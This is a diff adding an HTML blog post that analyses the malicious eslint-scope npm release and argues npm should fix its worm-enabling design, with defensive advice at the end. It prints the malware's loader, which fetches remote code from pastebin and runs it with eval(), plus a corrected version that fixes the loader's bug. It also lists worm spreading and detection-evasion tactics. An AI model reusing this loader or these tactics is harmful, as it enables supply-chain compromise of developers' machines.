@@ -1,0 +1,638 @@
+<!doctype html>
+<html lang="en" dir="ltr">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>How to build an npm worm</title>
+
+    <style media="screen">
+      body {
+        max-width: 900px;
+        margin: 16vw auto;
+        padding: 0 8vw;
+        background: rgb(2, 1, 43);
+        color: rgb(208, 255, 166);
+
+        font-family: "SFMono-Regular", Consolas, "Liberation Mono", Menlo, Courier, monospace;
+        font-size: 1.4em;
+        line-height: 1.6;
+        -webkit-font-smoothing: antialiased;
+      }
+
+      h1 {
+        line-height: 1;
+      }
+
+      ul, ol {
+        padding-left: 2em;
+        list-style-position: inside;
+      }
+
+      li {
+        margin: 1em 0;
+      }
+
+      a {
+        text-decoration: none;
+        color: rgb(208, 255, 166);
+        border-bottom: 2px solid;
+        padding-bottom: 2px;
+      }
+
+      code, pre {
+        font-family: inherit;
+        background: rgb(4, 2, 76);
+        color: rgb(199, 148, 255);
+      }
+
+      code {
+        padding: 0.2em 0.4em;
+      }
+
+      pre {
+        padding: 1em;
+        margin: 1em 0;
+        overflow: auto;
+      }
+
+      aside, blockquote {
+        background: rgb(4, 2, 76);
+        color: rgb(199, 148, 255);
+        border-left: 2px solid rgb(208, 255, 166);
+        margin: 1em 0;
+      }
+
+      aside {
+        padding: 0.25em 1.25em;
+      }
+
+      blockquote {
+        padding: 1em 2em;
+      }
+
+      q {
+        font-style: italic;
+      }
+    </style>
+  </head>
+  <body>
+
+    <h1>
+      How to build an npm worm
+    </h1>
+
+    <p>
+      <a href="https://www.npmjs.com">npm</a> is a registry and package manager
+      for JavaScript that ships as part of <a href="https://nodejs.org/en/">Node.js</a>.
+      It's used by tens of millions of people to install hundreds of thousands
+      of packages billions of times every week.
+    </p>
+
+    <p>
+      Today it was <a href="https://github.com/eslint/eslint-scope/issues/39">reported</a>
+      that <code>eslint-scope</code> (an npm package with
+      59 million downloads) had been compromised.
+    </p>
+
+    <p>
+      A new version of the package was published which contained a malicious
+      script that was attempting to spread itself to other npm authors.
+    </p>
+
+    <p>
+      This type of script is known as a "worm" and while npm did a good job
+      shutting it down, they lucked out because the script contained a bug
+      which prevented it from spreading and caused it to get reported
+      immediately.
+    </p>
+
+    <h2>Fluke</h2>
+
+    <p>
+      I don't think anyone has tried to name this worm yet, so I'm going to
+      come up with a name for the purposes of this post.
+    </p>
+
+    <p>
+      I'm going to call it "The Fluke Worm", since a "Fluke" is a type of
+      parasitic worm, and while this worm could have been really bad, we lucked
+      out cause the author fucked up the code.
+    </p>
+
+    <h2>Script</h2>
+
+    <p>
+      This was the script (I've cleaned it up for readability):
+    </p>
+
+    <pre>try {
+  var https = require('https');
+  https.get({
+    hostname: 'pastebin.com',
+    path: '/raw/XLeVP82h',
+    headers: {
+      'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; rv:52.0) Gecko/20100101 Firefox/52.0',
+      'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
+    }
+  }, response => {
+    response.setEncoding('utf8');
+    response.on('data', contents => {
+      eval(contents);
+    });
+    response.on('error', () => {});
+  }).on('error', () => {});
+} catch (err) {}</pre>
+
+    <p>
+      While the author of Fluke tried really hard to prevent any errors from
+      being thrown (going as far as wrapping an asynchronous <code>https.get</code>
+      call with a synchronous <code>try-catch</code>), it still managed to
+      throw an error (Oh JavaScript, you reliable... you).
+    </p>
+
+    <p>
+      If you're wondering what the bug was, they opened a <code>response</code>
+      stream and listened for <code>data</code> but didn't wait until the
+      response closed before <code>eval()</code>-uating the response. Let me
+      fix that for you:
+    </p>
+
+    <pre>let contents = '';
+response.on('data', chunk => {
+  contents += chunk.toString();
+});
+response.on('end', () => {
+  eval(contents);
+});</pre>
+
+
+    <p>
+      But while the script may have its issues, it's important to know what it
+      was attempting to do.
+    </p>
+
+    <p>
+      It uses Node's built-in <code>https</code> module in order to (attempt to)
+      make a request to a pastebin url (which has been deleted) and evaluating
+      the contents.
+    </p>
+
+    <p>
+      By using a Pastebin, the author of Fluke could have tried to make
+      updates to the worm simply by editing the contents.
+    </p>
+
+    <h2>Worms</h2>
+
+    <p>
+      Let's take a step back and understand what a worm is.
+    </p>
+
+    <p>
+      A "worm" is a piece of malicious code which attempts to spread itself to
+      as many machines as possible.
+    </p>
+
+    <p>
+      Worms need something that connect all the computers between it. Most of
+      the time this is the network (either the public internet or private
+      intranets). Although, if you go back far enough you can find worms that
+      spread through floppy disks and such.
+    </p>
+
+    <p>
+      In this case, the thing that is connecting us is npm.
+    </p>
+
+    <h2>Response</h2>
+
+    <p>
+      Luckily Fluke (as far as we now know) only seems to have infected one
+      major package.
+    </p>
+
+    <p>
+      In response, npm has taken the published version of the package down and
+      has invalidated every npm token so that developers will have to login
+      again. They are also advising that you use 2 Factor Authentication.
+    </p>
+
+    <p>
+      But none of that removes the risk that we have, a new worm could come out
+      at any time.
+    </p>
+
+    <h2>Risk</h2>
+
+    <p>
+      npm currently claims to have about 10 million users. Those users include
+      everyone from new programmers in a coding bootcamp to multi-billion dollar
+      corporations.
+    </p>
+
+    <p>
+      npm also reports that they have about <strong>5 Billion</strong>
+      individual package downloads per week. That's 500 package downloads a
+      week per user.
+    </p>
+
+    <p>
+      And that's important because a worm like this can take advantage of how
+      often people are downloading code from the internet in order to spread
+      itself as fast as possible. And it needs to spread as fast as possible in
+      order to infect everyone before being detected.
+    </p>
+
+    <p>
+      If this worm hadn't been broken, it could have infected hundreds (maybe
+      even thousands) of packages before being detected.
+    </p>
+
+    <p>
+      If it had been more sophisticated, it could have been much harder to kill
+      completely.
+    </p>
+
+    <h2>Infect</h2>
+
+    <p>
+      Let's quickly talk about how Fluke could have gone down.
+    </p>
+
+    <p>
+      In order to grow as fast as possible, Fluke needs to insert itself into
+      something that gets installed by many people. In this case it targeted
+      one of ESLint's internal packages.
+    </p>
+
+    <p>
+      ESLint has been downloaded over 130 million times, and its contributors
+      included people who also worked on:
+    </p>
+
+    <ul>
+      <li>Yarn - an npm alternative client responsible for 40% of npm downloads</li>
+      <li>Babel - 150 million downloads</li>
+      <li>jQuery - 65 million downloads</li>
+      <li>CoffeeScript - 50 million downloads</li>
+      <li>(and many many more)</li>
+    </ul>
+
+    <aside>
+      <p>
+        <strong>Note:</strong> Many of these projects had already taken
+        precautions to prevent being taken over by malicious packages.
+      </p>
+    </aside>
+
+    <p>
+      If you keep traversing the graph of packages that depend on one another,
+      as well as the graph of authors who have access to other packages, it
+      doesn't take long to infect the entire registry.
+    </p>
+
+    <p>
+      So like... it's a pretty good target.
+    </p>
+
+    <p>
+      But how does it get introduced?
+    </p>
+
+    <p>
+      Well I'm not sure <em>exactly</em> how it happened in this case, but
+      here's one scenario that I've had to think about in the past.
+    </p>
+
+    <p>
+      Pretty much every major open source project out there (at least in the
+      JavaScript/Node community) will have automated CI that runs on pull
+      requests.
+    </p>
+
+    <p>
+      This CI is just there to run your tests, and it provides a nice feedback
+      loop to contributors, but since it runs automatically the second a pull
+      request is opened, you need to be careful what that CI process has access
+      to.
+    </p>
+
+    <p>
+      Many users of npm (including lots of major open source projects) chose to
+      use Continuous Deployment systems to automatically publish new versions
+      of their npm packages as things get merged into their <code>master</code>
+      branch. Most of the time, this is done in the same CI system as tests.
+    </p>
+
+    <p>
+      In order to publish to npm, you need to have a "token" (something to tell
+      npm that you are authenticated). And in order to publish to npm
+      automatically in CI, you need to put this token into your environment
+      variables.
+    </p>
+
+    <p>
+      Most of the time, people configure these environment variables in such a
+      way that both your "master" build and your "pull request/branch" build
+      get the same environment variables.
+    </p>
+
+    <p>
+      This means that simply by opening a pull request into the right repo, you
+      can gain authorization to publish packages.
+    </p>
+
+    <p>
+      Cool.
+    </p>
+
+    <p>
+      But then it gets even easier. Now that the worm has infected a major
+      package, anyone who then downloads the package will then also be infected.
+    </p>
+
+    <p>
+      If they happen to be logged into the npm registry (which likely the
+      majority of npm users with accounts are) then this worm can easily add
+      itself to any other packages that they have publish access to.
+    </p>
+
+    <h2>Hide</h2>
+
+    <p>
+      As the worm spreads itself to more and more packages, at some point it is
+      inevitably going to be detected. It may take a couple of hours or in very
+      bad cases a couple of days.
+    </p>
+
+    <p>
+      But how could it avoid detection for as long as possible?
+    </p>
+
+    <p>
+      Well first we need to know how people would discover it. There's a couple
+      obvious ones:
+    </p>
+
+    <ul>
+      <li><strong>Errors</strong> – Bugs, network failures, etc.</li>
+      <li><strong>Network activity</strong> – i.e. Locked down CI networks which report unexpected external requests</li>
+      <li><strong>Code</strong> – Just happen to find the code one way or another</li>
+    </ul>
+
+    <p>
+      A "well-designed" worm would know about these sort of things and would
+      take precautions to avoid getting caught.
+    </p>
+
+    <ul>
+      <li>Avoid errors from being seen by users (<code>try-catch</code>, etc.)</li>
+      <li>Avoid running consistently so errors aren't reproducable and users ignore them</li>
+      <li>Avoid making requests or doing anything that might be suspicious when you appear to be in an especially secure system</li>
+      <li>Avoid exposing code, hide it somewhere else on users systems that they are unlikely to notice</li>
+    </ul>
+
+    <p>
+      The better the worm hides, the more time it will have to infect.
+      Security-minded people can do a much better job than the above list.
+    </p>
+
+    <h2>Attack</h2>
+
+    <p>
+      Any worm presumably has a purpose more than just to infect itself
+      (although maybe someone just wants the bragging rights).
+    </p>
+
+    <p>
+      They might want to steal data, they might want to do damage to the
+      machine, these days there's a good chance they want to mine bitcoins on
+      everyone's computer. (Crypto-currencies are stupid and bad, don't @ me)
+    </p>
+
+    <p>
+      Because Node runs with full access to the file system and network by
+      default, you can do a whole lot with people's machines. Not to mention
+      the fact that many users run npm with <code>sudo</code>.
+    </p>
+
+    <p>
+      Oh, and just in case the worm wants to make sure it doesn't get stopped
+      early on, it might even go as far as continuing to fight even after it's
+      been noticed. There are plenty of ways to do that.
+    </p>
+
+    <p>
+      You can see that Fluke was trying to do that by using an editable
+      Pastebin so that it could keep updating the code to do new things.
+    </p>
+
+    <p>
+      That's right, worms can be built to auto-update. Finding new creative
+      ways to be a pain in the ass for the people trying to stop them.
+    </p>
+
+    <p>
+      Maybe it'll even set up a daemon to keep injecting itself into packages
+      even after it has been removed from them.
+    </p>
+
+    <h2>Trust</h2>
+
+    <p>
+      You may be wondering...
+    </p>
+
+    <blockquote>
+      <q>What the fuck Jamie? Why are you teaching everyone how to create a
+      worm like this? Do you have to expose it to the entire world?!</q>
+    </blockquote>
+
+    <p>
+      For starters, I'm not exposing it to the entire world... That already
+      happened:
+    </p>
+
+    <blockquote>
+      <h4>
+        <a href="https://www.kb.cert.org/vuls/id/319816">Vulnerability Note VU#319816 - "npm fails to restrict the actions of malicious npm packages"</a>
+      </h4>
+      <p>
+        <q>npm allows packages to take actions that could result in a malicious
+        npm package author to create a worm that spreads across the majority of
+        the npm ecosystem.</q>
+      </p>
+    </blockquote>
+
+    <p>
+      Thousands of people already know about this vulnerability, and
+      the vast majority of them are completely capable of exploiting it. The
+      only reason people <em>haven't</em> exploited it so far is:
+    </p>
+
+    <ol>
+      <li>Because they are decent people.</li>
+      <li>Because they have something to lose if other people start exploiting it.</li>
+    </ol>
+
+    <p>
+      You see, the truth is that this massive community we've built is built on
+      <strong>trust</strong>.
+    </p>
+
+    <p>
+      npm <em>trusts</em> that it's users won't do anything malicious, and if
+      they do, npm <em>trusts</em> that they'll be able to catch it before it
+      does anything too harmful.
+    </p>
+
+    <p>
+      Trust is a big deal in the security industry. If you want users to give
+      you control over their data, you <em>need</em> to trust you.
+    </p>
+
+    <p>
+      When you lose people's trust, your business is in danger. Just ask
+      Facebook who lost billions of dollars by handing user data over to
+      Cambridge Analytica (and so many others).
+    </p>
+
+    <p>
+      If you want to gain and keep users' trust, you need to do everything
+      you can to protect them.
+    </p>
+
+    <h2>npm</h2>
+
+    <p>
+      npm knows it's security flaws. It's been alerted about them many time. I
+      was joking about them with the COO just the other day.
+    </p>
+
+    <p>
+      But look at the response from npm when the ability to build a worm was
+      disclosed over 2 years ago:
+    </p>
+
+    <blockquote>
+      <p><strong>Jan 7 2016</strong> – ­­Response from npm</p>
+      <p><strong>Jan 8 2016</strong> – Confirmation of works as intended no intention to fix at the moment from npm.</p>
+    </blockquote>
+
+    <p>
+      There was room to do something more there. And in the two years since
+      then, despite it coming up regularly, the registry hasn't done much to
+      prevent what almost happened today.
+    </p>
+
+    <p>
+      They've introduced 2-Factor Authentication, they've introduced lockfiles,
+      they've acquired a Node security startup, and started building auditing
+      tools. And while they all help quite a bit, they don't solve the problem.
+    </p>
+
+    <p>
+      The reason they have stated for not addressing this problem head on is
+      because any security solution would get in the way of users. It'd be
+      harder to publish npm packages, and even harder to automate.
+    </p>
+
+    <p>
+      And you see, harder npm publishing means harder npm adoption. My fear is
+      that they are refusing to do something here because they are a startup
+      focused on growth. Their VCs are undoubtably demanding that growth.
+    </p>
+
+    <p>
+      Capitalism strikes again I guess.
+    </p>
+
+    <p>
+      Sigh.
+    </p>
+
+    <h2>Fix</h2>
+
+    <p>
+      But the reason I really wanted to write this article is that I want
+      things to get <em>better</em>. I don't want worms to be successful
+      because the community was uneducated on how they work and what to do
+      about them.
+    </p>
+
+    <p>
+      Security through obscurity is thankfully pretty effective, but it's
+      dangerous to build something important on. The npm ecosystem and
+      community play a vital role in how many people in the world write code.
+      They shouldn't depend on security through obscurity.
+    </p>
+
+    <p>
+      So npm has lost some trust today, and now we find ourselves in the
+      position where we need to protect ourselves <em>from</em> npm.
+    </p>
+
+    <p>
+      npm has already revoked all your tokens, but please:
+    </p>
+
+    <ul>
+      <li>Setup 2-Factor Authentication</li>
+      <li>Use lockfiles (they help prevent worms from spreading as fast)</li>
+      <li>
+        Make sure you aren't automating npm publishing in a way that exposes
+        your token.
+      </li>
+      <li>
+        Be more careful about the dependencies being
+        introduced to your codebase.
+      </li>
+    </ul>
+
+    <p>
+      But honestly, the amount of work we'd all need to put in to truly prevent
+      this from happening again... it's just never going to happen. Asking each
+      individual user to go out of their way to secure themselves. It won't
+      work.
+    </p>
+
+    <p>
+      It's on npm to fix this problem, and until they do we're gonna keep being
+      at risk. And I hate that, I hate being put in this position where I'm the
+      bad guy for trying to raise awareness to something <em>soo</em> important.
+    </p>
+
+    <p>
+      I got into open source because it was fun. I stayed because I saw how
+      much we can improve the world around us. I take it seriously because I
+      know how much we have to lose.
+    </p>
+
+    <p>
+      It bothers me greatly that npm is a private company. It bothers me that
+      npm is closed-source (the registry and server). It bothers me because I
+      can't contribute. I can only get upset.
+    </p>
+
+    <p>
+      I get it #HugOps.
+    </p>
+
+    <p>
+      But if npm was open source (not just the client), we wouldn't have to hug
+      ops. We could contribute back. I know there's security engineers at every
+      major company these days that would kill for the opportunity to improve
+      npm's security.
+    </p>
+
+    <p>
+      The question comes: Why do we give a private company a monopoly over the
+      Node ecosystem if they refuse to open source their software?
+    </p>
+
+    <p>
+      The next worm might not be a fluke.
+    </p>
+  </body>
+</html>
